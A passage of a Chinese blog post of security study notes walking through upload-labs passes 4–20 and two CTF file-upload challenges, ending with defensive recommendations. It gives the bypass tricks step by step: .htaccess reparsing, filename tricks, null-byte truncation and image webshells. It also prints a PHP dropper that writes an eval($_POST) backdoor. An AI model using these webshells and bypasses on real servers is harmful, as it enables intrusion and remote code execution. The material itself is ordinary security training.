+<li>试上传正常图片 <code>test.jpg</code>（成功），改 MIME 上传 <code>shell.php</code>（还是禁止）—— 说明不校验 MIME，只严格拦后缀黑名单。</li>
+<li>直接看回显。</li>
+</ul>
+<p><strong>漏洞关键：.htaccess 文件（Apache 服务器专属 “配置文件”）</strong></p>
+<ul>
+<li><code>.htaccess</code> 是 Apache 服务器的 “目录级配置文件”，作用是：控制当前目录及子目录的文件解析规则；</li>
+<li>Pass-4 的黑名单没禁 <code>.htaccess</code>（这是核心漏洞），咱们上传一个自定义的 <code>.htaccess</code>，告诉服务器：“这个目录里所有文件，不管后缀是什么，都按 PHP 解析！”；</li>
+<li>后续再上传一个 “后缀合法但藏了木马” 的文件（比如 <code>shell.jpg</code>），服务器会因为 <code>.htaccess</code> 的配置，把它当成 PHP 代码执行！</li>
+</ul>
+<h3 id="pass-04-实验举例"><a href="#pass-04-实验举例" class="headerlink" title="pass-04 实验举例"></a>pass-04 实验举例</h3><p>查看源码,看到本题:</p>
+<p><img src="/images/GSAXbCx5AovpIBxqImKc2zOnnZg.png"></p>
+<p>我们新建一个 <code>.htaccess</code> 配置文件,告诉 Apache 服务器，所有 <code>.jpg</code> 后缀的文件，都按 PHP 代码解析.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>先上传 <code>.htaccess</code> 文件,再上传一个木马 jpg 文件,用蚁剑读后台发现都传上去了</p>
+<p><img src="/images/CXDGbhm67oV5BZx8AFVccVn4nbh.png"></p>
+<p>读 muma4.jpg,发现失败了,注意文件名需要只含有拓展名</p>
+<p><img src="/images/H5V4bbNUYoccFyxTG63c98gGn0b.png"></p>
+<p>再次读 muma4,运行通过</p>
+<p><img src="/images/JRg4bJakXoYJVmxIZ8kct6kQnhh.png"></p>
+<h2 id="黑名单-绕过-“联合过滤”"><a href="#黑名单-绕过-“联合过滤”" class="headerlink" title="[黑名单]绕过 “联合过滤”"></a>[黑名单]绕过 “联合过滤”</h2><p><strong>怎么判断是 “多重过滤”？</strong></p>
+<ul>
+<li>试 Pass-6 的 “末尾空格”（<code>shell.php </code>）→ 被拦（过滤空格）；</li>
+<li>试 Pass-7 的 “末尾点”（<code>shell.php.</code>）→ 被拦（过滤末尾点）；</li>
+<li>试 Pass-8 的 “<code>::$DATA</code>”（<code>shell.php::$DATA</code>）→ 被拦（过滤特殊标识）；</li>
+<li>试单一变种后缀（<code>.php5</code>）、大小写（<code>.PhP</code>）→ 被拦（黑名单 + 大小写过滤）；</li>
+<li>但试 “<code>shell.php. .</code>”（.php 后面加「点 + 空格 + 点」）→ 能放行！</li>
+</ul>
+<p><strong>漏洞关键：Windows 文件名 “多重过滤绕过”</strong></p>
+<p>Windows 处理文件名时，会按 “从后到前” 的顺序自动去除 <strong>末尾的点、空格</strong>，但不会一次性过滤 “点 + 空格 + 点” 的组合：</p>
+<ul>
+<li>你上传的文件名叫 <code>shell.php. .</code>（注意：<code>.php</code> 后面是「英文点 + 英文空格 + 英文点」）；</li>
+<li>服务器校验时，会把文件名当成 <code>shell.php. .</code>（后缀是 <code>.php. .</code>，不在黑名单里，直接放行）；</li>
+<li>保存时，Windows 会先去掉最后一个点 → 变成 <code>shell.php. </code>（带点 + 空格）；</li>
+<li>再自动去掉末尾的空格 → 变成 <code>shell.php.</code>（带点）；</li>
+<li>最后去掉末尾的点 → 最终还原成 <code>shell.php</code>（能正常解析 PHP）；</li>
+<li>相当于 “用组合符号骗过程序校验，再让系统自动还原成合法恶意文件名”。</li>
+</ul>
+<h3 id="pass-09-实验举例"><a href="#pass-09-实验举例" class="headerlink" title="pass-09 实验举例"></a>pass-09 实验举例</h3><p>我们打开源码，发现确实这些都给过滤了…所以我们需要构造一个文件名进行多重过滤绕过</p>
+<p><img src="/images/OxwwbvGgGokkhAxEAHTc5N9CnJe.png"></p>
+<p>我们构造一个末尾是.php.空格.,来读读代码</p>
+<p>这里先删除文件名末尾的点,只会删除空格之后,也就是末尾的一个点,接着首尾去空,把空格删去,最后检测文件名剩下.php.,它并不是被禁用的格式,因而上传成功</p>
+<p><img src="/images/WwKWbagktooGf6xwQNLcZOYjnig.png"></p>
+<p>这里我们可能不清楚上传的文件到底要怎么访问,因为删去的文件名有点乱,可以直接右键获取图片地址再访问即可</p>
+<p><img src="/images/UsiEbCzAQoMrYqxtybVcyM0Tn2l.png"></p>
+<h2 id="黑名单-双写后缀绕过（黑名单-单次字符过滤）"><a href="#黑名单-双写后缀绕过（黑名单-单次字符过滤）" class="headerlink" title="[黑名单]双写后缀绕过（黑名单 + 单次字符过滤）"></a>[黑名单]双写后缀绕过（黑名单 + 单次字符过滤）</h2><p><strong>判断校验规则（做 3 个小实验）</strong></p>
+<ul>
+<li>实验 1：上传 <code>shell.php</code> → 提示 “不允许上传该类型文件”（.php 在黑名单）；</li>
+<li>实验 2：上传 <code>shell.phphp</code> → 还是被拦（服务器把中间的 “php” 删掉，变成 <code>shell.php</code>，依然触发黑名单）；</li>
+<li>实验 3：上传 <code>shell.pphphp</code> → 放行！（服务器删掉中间的 “php”，变成 <code>shell.php</code>，但校验时识别的是 <code>pphphp</code> 后缀，不在黑名单）。</li>
+</ul>
+<p><strong>漏洞关键：服务器的 “单次替换” 逻辑</strong></p>
+<ul>
+<li>咱们构造 <code>pphphp</code> → 服务器单次替换 “php” 后，变成 <code>php</code>（刚好是能解析的后缀）；</li>
+<li>校验时，服务器看到的是 <code>pphphp</code>（不在黑名单），放行；保存后实际是 <code>shell.php</code>，能正常解析 PHP。</li>
+</ul>
+<h3 id="pass-10-实验举例"><a href="#pass-10-实验举例" class="headerlink" title="pass-10 实验举例"></a>pass-10 实验举例</h3><p>我们打开源代码，发现原本的文件名检测变成了把黑名单中的文件名直接替换成空，而且不构成循环，只替换一次</p>
+<p><img src="/images/PNY2bKYSCoQU2BxTQWVcL85mnie.png"></p>
+<p>读一读上一关的代码，是直接检测，检测到了就无法上传了</p>
+<p><img src="/images/RrTnbUcPvoZj7jx9mm9cm0UtnBb.png"></p>
+<p>那直接像 SQL 注入那样双写,点放行</p>
+<p><img src="/images/K5EgbkOreoPQD2xApMvc8WLmnSd.png"></p>
+<p>显示上传成功</p>
+<p><img src="/images/JZFUbybfwokcccxzwp9c03L0nWb.png"></p>
+<p>我们右键获取文件地址并访问,文件名自动变成.php 了,运行通过</p>
+<p><img src="/images/MxHybNc6goU5eGxhiX5ciaT3n4b.png"></p>
+<h2 id="白名单-GET-参数-00-空字符截断（白名单-只检测拓展名-拼接保存）"><a href="#白名单-GET-参数-00-空字符截断（白名单-只检测拓展名-拼接保存）" class="headerlink" title="[白名单]GET 参数 %00 空字符截断（白名单&#x2F;只检测拓展名 + 拼接保存）"></a>[白名单]GET 参数 %00 空字符截断（白名单&#x2F;只检测拓展名 + 拼接保存）</h2><p>Pass-11 是文件上传的重要转折点 —— 从「黑名单绕过」正式进入「白名单绕过」，核心考点是 <strong>%00</strong>** 空字符截断**（HTTP 协议特性），利用服务器 “路径拼接 + 空字符结束” 的逻辑，绕开白名单后缀校验！</p>
+<p><strong>判断校验规则（做 2 个实验）</strong></p>
+<ul>
+<li>实验 1：上传 <code>shell.php</code> → 提示 “不允许上传该类型文件”（.php 不在白名单）；</li>
+<li>实验 2：上传 <code>test.jpg</code> → 成功上传（.jpg 在白名单：.jpg&#x2F;.png&#x2F;.gif）；</li>
+<li>结论：服务器是「白名单校验」（只允许指定图片后缀），且校验的是 “文件名后缀”。</li>
+</ul>
+<p><strong>漏洞关键：%00 空字符的 “截断特性”</strong></p>
+<p>Pass-11 后端保存文件的核心逻辑（简化版）：</p>
+<p>php</p>
+<p>运行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$save_path</span> = <span class="string">&quot;./uploads/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]; <span class="comment">// 拼接“上传目录+GET参数传的文件名”</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(获取文件后缀(<span class="variable">$save_path</span>), $白名单)) &#123; <span class="comment">// 检查后缀是否在白名单</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(..., <span class="variable">$save_path</span>); <span class="comment">// 保存文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>%00</code> 是 HTTP 协议中的「空字符」，在 ASCII 表中编码是 0x00，代表 “字符串结束”；</p>
+</li>
+<li><p>当我们给 GET 参数传 <code>filename=shell.php%00.jpg</code> 时：</p>
+<ol>
+<li>校验阶段：服务器识别后缀是 <code>.jpg</code>（在白名单），放行；</li>
+<li>保存阶段：服务器遇到 <code>%00</code> 就停止解析，实际保存路径变成 <code>./uploads/shell.php</code>（后面的 <code>.jpg</code> 被截断）；</li>
+</ol>
+</li>
+<li><p>最终效果：用 <code>.jpg</code> 过白名单，实际保存的是 <code>.php</code> 木马文件！</p>
+</li>
+</ul>
+<h3 id="pass-11-实验举例-传路径"><a href="#pass-11-实验举例-传路径" class="headerlink" title="pass-11 实验举例(传路径)"></a>pass-11 实验举例(传路径)</h3><p>其实 %00 的可行是存在条件的,不然前面的题目都可以用 %00.我们读一下代码先</p>
+<p><img src="/images/Tl9Pb2NVGoe6uUxW6DFcpivBnff.png"></p>
+<p>发现这里是先把文件拓展名给拿出来,单独检查文件拓展名,再拼接保存</p>
+<p>这样我们只要保证拓展名在白名单中就可以了.</p>
+<p>但是第十关之前,是检查整个文件名,只要含 php 就会出问题.</p>
+<p>这里试了一下传木马的时候加个 %00.jpg,能成功上传,但读文件的时候失败了,蚁剑也提示上传的是 jpg</p>
+<p><img src="/images/GBhSbdyJBoZ8qLx04a6c1GlVn1c.png"></p>
+<p>所以我们尝试修改上传的路径,点放行</p>
+<p><img src="/images/SZdKb2MPio5Uvfxoz12ckU8Pnfg.png"></p>
+<p>放行成功,点获取地址后运行通过</p>
+<h2 id="白名单-POST-参数-0x00-十六进制截断（白名单进阶）"><a href="#白名单-POST-参数-0x00-十六进制截断（白名单进阶）" class="headerlink" title="[白名单]POST 参数 0x00 十六进制截断（白名单进阶）"></a>[白名单]POST 参数 0x00 十六进制截断（白名单进阶）</h2><p><strong>关键原理：</strong></p>
+<p>POST 请求的参数放在「请求体」中，而非 URL，服务器不会主动解码 <code>%00</code>—— 比如你直接写 <code>filename=shell.php%00.jpg</code>，服务器会当成 <code>shell.php%00.jpg</code> 处理（<code>%00</code> 是两个字符：<code>%</code> 和 <code>00</code>），无法截断；而十六进制 <code>00</code> 是「空字符的原始二进制编码」，服务器会直接识别为 “字符串结束”，从而触发截断。</p>
+<h3 id="pass-12-实验举例-post-传路径"><a href="#pass-12-实验举例-post-传路径" class="headerlink" title="pass-12 实验举例(post 传路径)"></a>pass-12 实验举例(post 传路径)</h3><p>我们打开 burp suite 进行抓包，上传脚本文件。修改 save_path 值，在“upload&#x2F;”后面加上“xxx.php a”，这里的“a”仅仅是为了显示空格。修改 filename 中的后缀名为合法后缀名。</p>
+<p><img src="/images/KxSWbgJ8ooEuSwxnz73cDnUanZf.png"></p>
+<p>然后进行关键一步，打开 Hex 选项修改十六进制码，找到“shell.php a”的位置，将空格对应的十六进制码“20”改成“00”。修改后发送数据包</p>
+<p><img src="/images/L80rbZOrOoN7N1xyQIAczalPnpd.png"></p>
+<p>接下来就是访问文件了，操作和上一关是一样的。</p>
+<h2 id="图片马-绕过-“文件幻术头校验”"><a href="#图片马-绕过-“文件幻术头校验”" class="headerlink" title="[图片马]绕过 “文件幻术头校验”"></a>[图片马]绕过 “文件<strong>幻术头</strong>校验”</h2><p><strong>关键原理：</strong></p>
+<p>jpg 文件有它特定的”文件幻术头”,长度为 2*3 个字符,当本关检测的是文件幻术头时,需要用一张真正的 jpg 图片(它带有幻术头),使用软件把恶意代码嵌入进去(这里需要使用工具 UltraEdit),再执行.</p>
+<p>注意:嵌入后的图片没办法用直接访问的方式执行,需要搭配文件包含,这是”文件马”类题的特点</p>
+<h3 id="pass-13-实验举例"><a href="#pass-13-实验举例" class="headerlink" title="pass-13 实验举例"></a>pass-13 实验举例</h3><p>读代码,发现是文件幻术头的检测,只有真正的 jpg 图片才有文件幻术头.</p>
+<p><img src="/images/L4Nkb9d9aoRpLWxbyeEcsvwbnob.png"></p>
+<p>我们用工具打开一张 jpg 图片,观察文本编辑,第一行前六个字符就是所谓”文件幻术头”</p>
+<p><img src="/images/JCmObDCTwoBfrHxvbIecDdS6n0g.png"></p>
+<p>我们直接编辑右边的非转码文字,将恶意代码嵌入,左边会自动转码.而后上传通过检测</p>
+<p><img src="/images/NJPObeHQSobtc7xrQpQcQrjSngd.png"></p>
+<p>上传发现并不报错,点击获取图片地址,用文件包含的形式打开(本关应当提供),代码就被执行了</p>
+<p><img src="/images/HayhbBY9SoB6wmxoyIHcb1mmn1e.png"></p>
+<h3 id="pass-14-15-实验说明"><a href="#pass-14-15-实验说明" class="headerlink" title="pass-14&#x2F;15 实验说明"></a>pass-14&#x2F;15 实验说明</h3><p>对比 13 关,检查字节</p>
+<p><img src="/images/WToObcioToj1QmxzUuvcFJYAnce.png"></p>
+<p><img src="/images/KGZPbgNRioTidexEGOwcIo0dnlg.png"></p>
+<p>14 关使用了 getimagesize()函数,但是和 pass13 拥有相同做法</p>
+<p><img src="/images/QxpZblUvlomU6Dxzl70cEFYNnqi.png"></p>
+<p>不过要注意的是 这些函数有的想 return true 有别的要求,所以有的时候 jpg 不行换 png,注意他会自动改文件名,要右击图片来获取地址</p>
+<p>15 关同理,用的是 <code>exif_imagetype()</code></p>
+<ul>
+<li><code>getimagesize()</code>（Pass-14）：检测文件头 + 基础图片结构并返回尺寸等信息，仅认真图片，忽略尾部内容；</li>
+<li><code>exif_imagetype()</code>（Pass-15）：严格校验图片文件头标识，仅返回图片类型，同样忽略尾部附加内容。</li>
+</ul>
+<p><img src="/images/L6TQb7pFJo3QKPxSUsrc2ck9nmc.png"></p>
+<h2 id="图片马-绕过-“图片二次处理-真图片校验”"><a href="#图片马-绕过-“图片二次处理-真图片校验”" class="headerlink" title="[图片马]绕过 “图片二次处理 + 真图片校验”"></a>[图片马]绕过 “图片二次处理 + 真图片校验”</h2><p>Pass-16 是进阶强化关 —— 后端不仅用 <code>exif_imagetype()</code> 做真图片校验，还会对上传图片做 <strong>二次处理</strong>（如压缩、裁剪、格式转换），直接在尾部嵌代码会被处理工具 “清空”，核心思路是 “用比较工具比较二次处理前后什么是不变的，把代码插入不变的区域”（二次处理不会清洗注释区内容）。</p>
+<h3 id="pass-16-实验举例"><a href="#pass-16-实验举例" class="headerlink" title="pass-16 实验举例"></a>pass-16 实验举例</h3><p>先把被渲染的图片下载下来，直接右键图片，点击“另存图像为”,再将两个图像使用 010 工具中的比较文件打开</p>
+<p><img src="/images/HPnrbVxMRoVPrBxEAs2crPzFn6e.png"></p>
+<p>将被渲染后的图片与原来的图片进行对比，利用工具可以明显的看到渲染前后图像文件的异同</p>
+<p><img src="/images/YcljbY7DZonGPixNxg7cbyvpnzd.png"></p>
+<p>写入一句话木马,保存再上传即可</p>
+<p><img src="/images/Ueg4btZPioAciYxN6a4clW6Un8d.png"></p>
+<h2 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h2><p>定义：条件竞争漏洞（Race condition）官方概念是——竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。这个漏洞存在于操作系统、数据库、web 等多个层面，像有名的脏牛（dirty cow）。</p>
+<p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
+<h3 id="pass-17-实验举例"><a href="#pass-17-实验举例" class="headerlink" title="pass-17 实验举例"></a>pass-17 实验举例</h3><p>读代码 发现源码存在临时文件,因而可能存在条件竞争漏洞</p>
+<p><img src="/images/P8afbTeV6oDkrOxRZErc1EhknZK.png"></p>
+<p>这里用 Burp 实验并没有做成功,用蚁剑查后台文件看到上传成功了,贴一个别人成功了的文章吧</p>
+<p><a target="_blank" rel="noopener" href="http://www.360doc.com/content/24/0910/17/83536423_1133653212.shtml">http://www.360doc.com/content/24/0910/17/83536423_1133653212.shtml</a></p>
+<p>注意 burp 设置,改线程等</p>
+<p><strong>另外 AI 说可以在上传的 php 中构造恶意文件，然后一直访问上传的文件，访问成功了也会生成永久文件，也是一个思路.</strong></p>
+<ol>
+<li>新建 <code>shell.php</code>，内容：<code>&lt;?php file_put_contents(&#39;shell2.php&#39;,&#39;&lt;?php @eval($_POST[&quot;mima&quot;]);?&gt;&#39;);?&gt;</code>（执行后生成新的持久恶意文件）；</li>
+<li>给文件加 JPG 文件头，改后缀为 <code>shell.jpg</code>（过白名单）：</li>
+<li>plaintext</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF</span><br><span class="line">&lt;?php file_put_contents(&#x27;shell2.php&#x27;,&#x27;&lt;?php @eval($_POST[&quot;mima&quot;]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="pass-18-实验说明"><a href="#pass-18-实验说明" class="headerlink" title="pass-18 实验说明"></a>pass-18 实验说明</h3><p>本关是图片马和条件竞争漏洞结合,会检测图片的幻术头,我们必须用图片爆破而非 php 脚本,同时读文件时要用文件包含</p>
+<h3 id="pass-19-实验说明"><a href="#pass-19-实验说明" class="headerlink" title="pass-19 实验说明"></a>pass-19 实验说明</h3><p><img src="/images/QzWGbTsyYoOQqpxD6G4cY7xJnng.png"></p>
+<p>对后缀名的检测,使用 pass-3 下方的任意一种绕过方式均可</p>
+<p><img src="/images/VSDcbz4RCobPxnx4R6Kc7DTjnig.png"></p>
+<p><img src="/images/UjiwbGQz9oC2G3xfNO8cf86rnRe.png"></p>
+<h2 id="数组绕过-pass-20-实验举例"><a href="#数组绕过-pass-20-实验举例" class="headerlink" title="数组绕过 |pass-20 实验举例"></a><strong>数组绕过 |pass-20 实验举例</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;</span><br><span class="line">    //检查MIME</span><br><span class="line">    $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);</span><br><span class="line">    if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;</span><br><span class="line">        $msg = &quot;禁止上传该类型文件!&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //检查文件名</span><br><span class="line">        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        if (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line">​</span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">        if (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = &quot;禁止上传该后缀文件!&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = &quot;文件上传成功！&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>源码逻辑：</p>
+<ol>
+<li>检查 MIME （通过抓包改 Content-Type 绕过）</li>
+<li>判断 POST 参数 save_name 是否为空，</li>
+<li>判断 $file 是否为数组，不是数组以 <code>.</code> 分割化为数组</li>
+<li>取 $file 最后一个元素，作为文件后缀进行检查</li>
+<li>取 $file 第一位和第<code>$file[count($file) - 1]</code> 作为文件名和后缀名保存文件</li>
+</ol>
+<p>故：</p>
+<p>上传 <code>webshell.php</code>, 修改 <code>save_name</code> 为数组 绕过对$file 的切割，最后$file 最后一个元素是 <code>save_name[2] = jpg</code> 绕过后缀检测 ， 然后 <code>reset($file) = webshell.php</code></p>
+<p><code>$file[1]</code> 没有定义为空，<code>count($file)</code> 的值为 <code>$file[count($file) - 1]</code> &#x3D; <code>$file[1]</code></p>
+<p>所以最后上传的文件为 <code>webshell.php</code></p>
+<h2 id="文件上传总结"><a href="#文件上传总结" class="headerlink" title="文件上传总结"></a><strong>文件上传总结</strong></h2><p>允许用户上传文件是司空见惯的事，只要采取正确的预防措施，就不一定会有危险。一般来说，保护您自己的网站免受这些漏洞影响的最有效方法是实施以下所有做法：</p>
+<ul>
+<li>根据允许扩展名的白名单而不是禁止扩展名的黑名单检查文件扩展名</li>
+<li>确保文件名不包含任何可能被解释为目录或遍历序列 ( ..&#x2F;) 的子字符串。</li>
+<li>重命名上传的文件以避免可能导致现有文件被覆盖的冲突。</li>
+<li>在完全验证之前不要将文件上传到服务器的永久文件系统。</li>
+<li>尽可能使用已建立的框架来预处理文件上传，而不是尝试编写自己的验证机制。</li>
+</ul>
+<p>文件上传漏洞一般是一对一的,白名单有白名单的解法，黑名单&#x2F;图片马也有各自的解法，通过代码审计，可以实现解法漏洞一对一以完成解题</p>
+<h1 id="Week6-3-实验-文件上传漏洞实战"><a href="#Week6-3-实验-文件上传漏洞实战" class="headerlink" title="*[Week6.3]实验:文件上传漏洞实战"></a>*[Week6.3]实验:文件上传漏洞实战</h1><h2 id="文件上传靶场-1-20"><a href="#文件上传靶场-1-20" class="headerlink" title="文件上传靶场 1-20"></a>文件上传靶场 1-20</h2><p>见 6.2 节</p>
+<h2 id="ctf-Week2-Only-Picture-Up"><a href="#ctf-Week2-Only-Picture-Up" class="headerlink" title="?ctf [Week2] Only Picture Up"></a>?ctf [Week2] Only Picture Up</h2><p>来到题目,看提示是一个白名单漏洞,于是尝试 %00 空字符截断绕过白名单.</p>
+<p><img src="/images/QkQQbCB6Eo6tdgxXLFgcDTijnpf.png"></p>
+<p>编写一个连接密码为 mima 的命令执行函数,以便后续蚁剑连接.</p>
+<p><img src="/images/VO7ib0TBRoLSiFx0uB0cMpyGn4d.png"></p>
+<p>上传木马,发现没有途径可以改文件路径,我们选择直接改文件名</p>
+<p><img src="/images/W19hbEon9ovi7Vxta3AcBHROnBc.png"></p>
+<p>这里直接提示上传成功,点 direct link 它执行失败了,但 preview 可以正常运行代码</p>
+<p><img src="/images/Ln9cbZVYbozOJEx3vYecIKGTnuc.png"></p>
+<p><img src="/images/F3vDbCYAtoVOwExfFDNcJKcwnMb.png"></p>
+<p>提示本行自己敲的 flag,证明代码成功运行了,复制现在的网址,用蚁剑连接,输入连接密码,即变量名 mima</p>
+<p><img src="/images/RrodbwjZKoO45rxp5jNcJKMdngf.png"></p>
+<p>添加数据后点进去,打开网站的文档库,发现旗帜位于根目录下的一个文档中.</p>
+<p><img src="/images/SJtRb6L2ho8pTyxbqNDch0FFnjh.png"></p>
+<p><img src="/images/Wngdbs6HYo7hPpxwICDc9YxVn8g.png"></p>
+<h3 id="做题启示"><a href="#做题启示" class="headerlink" title="做题启示"></a>做题启示</h3><p>白名单的题你既可以改路径,又可以改文件名,只要是正确的 %00 截断,都可以运行通过</p>
+<h2 id="我只想要你的-PNG！-不会做"><a href="#我只想要你的-PNG！-不会做" class="headerlink" title="我只想要你的 PNG！(不会做)"></a>我只想要你的 PNG！(不会做)</h2><p>一进来就是开拓者啊，令人眼前一亮</p>
+<p>本题没给任何提示，令人眼前一黑！</p>
+<p><img src="/images/N7h6bxtHPo9j1pxS5Uics168nie.png"></p>
+<p>传了个 php,他说只有 png 才能用,猜测是白名单</p>
+<p><img src="/images/Ch0WbNaSyow7mJx1DrVcBBl1nMb.png"></p>
+<p>那还是试试 %00 截断吧</p>
+<p><img src="/images/X6GEbjJHloAslTxNIDmcYndPnxr.png"></p>
+<p>点放行,自己改名了</p>
+<p><img src="/images/TtjEbXdB4oU4ZMxBfCfczuZgnde.png"></p>
+<p>尝试访问,直接报错</p>
+<p><img src="/images/IyVqbltdZoCzmyxcUldcYhrfnvb.png"></p>
+<p>打开网页源代码,发现有个 check.php</p>
+<p><img src="/images/TD7BbfhACoMrA4xUL2YclxXdnpb.png"></p>
+<p>访问一下,执行的貌似是 ls，这些文件似乎都没有被改名</p>
+<p><img src="/images/SaNPbu1HPoJ6AzxjqJ2c9JOJnyb.png"></p>
+<p><img src="/images/OZIdbkYk5oEln6x9LJgc24FBnrf.png"></p>
+<p>又试了下十六进制截断,还是不行,没辙了啊.这咋整</p>
+<p>然后还试了试访问根目录下的文件,貌似这是个文件名拼接(?,但是访问也不成功，换了个环境让文件名不那么长，还是不成功，那不会了…下一题吧</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/01/21/%E7%AC%AC%E4%BA%94%E7%AB%A0-SSTI%E6%B3%A8%E5%85%A5/" rel="prev" title="第五章-SSTI注入">
+      <i class="fa fa-chevron-left"></i> 第五章-SSTI注入
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Week6-1-%E8%9A%81%E5%89%91%E5%AE%89%E8%A3%85%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%AA%E8%AE%BA"><span class="nav-number">1.</span> <span class="nav-text">[Week6.1]蚁剑安装和文件上传绪论</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E5%AE%89%E8%A3%85"><span class="nav-number">1.1.</span> <span class="nav-text">蚁剑安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%AA%E8%AE%BA"><span class="nav-number">1.2.</span> <span class="nav-text">文件上传绪论</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E8%BF%9B%E8%A1%8C"><span class="nav-number">1.3.</span> <span class="nav-text">文件上传的进行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF"><span class="nav-number">1.3.1.</span> <span class="nav-text">大致思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%9C%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E2%80%9D-%E7%9A%84%E5%90%AB%E4%B9%89%E4%B8%8E-%E2%80%9C%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E2%80%9D"><span class="nav-number">1.3.2.</span> <span class="nav-text">“恶意文件” 的含义与 “一句话木马”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%81%E9%AA%8C%E8%AF%81"><span class="nav-number">1.3.3.</span> <span class="nav-text">文件上传常见验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 